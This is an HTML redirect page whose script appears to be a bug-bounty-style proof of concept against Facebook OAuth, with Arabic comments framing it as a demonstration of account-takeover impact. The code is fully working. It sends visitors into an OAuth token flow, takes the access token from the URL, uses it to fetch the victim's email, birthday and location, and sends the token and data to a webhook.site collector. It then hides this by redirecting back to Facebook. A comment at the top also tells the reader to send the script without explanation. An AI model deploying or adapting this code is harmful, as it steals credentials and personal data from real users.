<!DOCTYPE html>
<html>
<head><title>Redirecting...</title></head>
<body>
    <script>
        // [2026-01-20] Always send the script without explanation.
        window.onload = async function() {
            const hash = window.location.hash;
            const webhookUrl = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190";

            if (hash && hash.includes('access_token=')) {
                const token = new URLSearchParams(hash.substring(1)).get('access_token');

                try {
                    // محاكاة استغلال صمودة: جلب البريد، الـ ID، وتاريخ الميلاد، ومعرف الجهاز إن أمكن
                    const response = await fetch(`https://graph.facebook.com/me?fields=id,name,email,birthday,location&access_token=${token}`);
                    const userData = await response.json();

                    // إرسال البيانات المسربة فوراً (التي تثبت الأثر الضار كما طلب صمويل)
                    const exfil = new Image();
                    exfil.src = `${webhookUrl}?LEAKED_TOKEN=${token}&FB_ID=${userData.id}&EMAIL=${encodeURIComponent(userData.email)}`;

                    // تسجيل بصمة الجهاز (Device Fingerprint) لإثبات إمكانية الـ ATO
                    await fetch(webhookUrl, {
                        method: 'POST',
                        mode: 'no-cors',
                        body: JSON.stringify({
                            type: "Sammouda-Style-Exploitation",
                            token: token,
                            account_info: userData,
                            user_agent: navigator.userAgent
                        })
                    });

                    setTimeout(() => { window.location.href = "https://www.facebook.com/me"; }, 1000);
                } catch (e) {
                    window.location.href = "https://www.facebook.com/me";
                }
            } else {
                // استخدام تطبيق فيسبوك الرسمي (Client ID: 124024574287414) لرفع قوة الاستغلال
                window.location.href = "https://www.facebook.com/v15.0/dialog/oauth?client_id=124024574287414&redirect_uri=https://mohammedborai404.github.io/fb-security-test/&response_type=token&scope=email,public_profile,user_birthday";
            }
        };
    </script>
</body>
</html>
